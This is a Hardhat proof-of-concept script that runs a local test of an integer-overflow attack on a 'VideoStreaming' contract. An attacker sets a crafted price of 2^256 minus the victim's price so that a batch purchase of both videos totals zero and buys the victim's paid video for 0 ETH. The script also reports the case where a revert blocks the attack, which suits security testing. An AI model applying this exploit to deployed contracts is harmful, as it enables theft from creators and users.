const hre = require("hardhat");
const { ethers } = hre;

async function main() {
  const [deployer, victim, attacker] = await ethers.getSigners();

  console.log("=== Integer overflow - direct contract attack ===\n");

  // Deploy the current VideoStreaming contract (includes the batch purchaseVideos).
  const VS = await ethers.getContractFactory("VideoStreaming");
  const vs = await VS.deploy();
  await vs.waitForDeployment();
  console.log("VideoStreaming deployed at:", await vs.getAddress());
  console.log("Victim  :", victim.address);
  console.log("Attacker:", attacker.address);

  // Victim uploads a real, paid video.
  const victimPrice = ethers.parseEther("0.1");
  const victimCid = "QmVictimVideo";
  await (await vs.connect(victim).uploadVideo(victimCid, victimPrice)).wait();
  console.log(`\nVictim uploaded "${victimCid}" @ ${ethers.formatEther(victimPrice)} ETH`);

  // Attacker uploads a video with a crafted price so victimPrice + evilPrice == 2^256 (== 0).
  const TWO_256 = 2n ** 256n;
  const evilPrice = TWO_256 - victimPrice;
  const evilCid = "QmEvilVideo";
  await (await vs.connect(attacker).uploadVideo(evilCid, evilPrice)).wait();
  console.log(`Attacker uploaded "${evilCid}" @ (2^256 - victimPrice) wei`);
  console.log("   -> chosen so the unchecked batch total overflows back to 0");

  // Attacker batch-buys BOTH videos while sending 0 ETH.
  console.log("\nAttacker calls purchaseVideos([victim, evil]) with value = 0 ETH ...");
  let reverted = false;
  try {
    await (await vs.connect(attacker).purchaseVideos([victimCid, evilCid], { value: 0 })).wait();
  } catch (e) {
    reverted = true;
    const msg = (e.shortMessage || e.message || "").split("\n")[0];
    console.log("   Transaction REVERTED:", msg);
  }

  const stole = await vs.videoPurchasers(victimCid, attacker.address);

  console.log("\n--- Result ---");
  if (!reverted && stole) {
    console.log("Attacker paid:                               0 ETH");
    console.log("Attacker has access to victim's paid video: ", stole, " <-- STOLEN FOR FREE");
  } else {
    console.log("Attack blocked - the overflow reverted.");
    console.log("Attacker has access to victim's paid video: ", stole, " <-- attack failed");
  }
}

main()
  .then(() => { process.exitCode = 0; })
  .catch((e) => { console.error(e); process.exitCode = 1; });
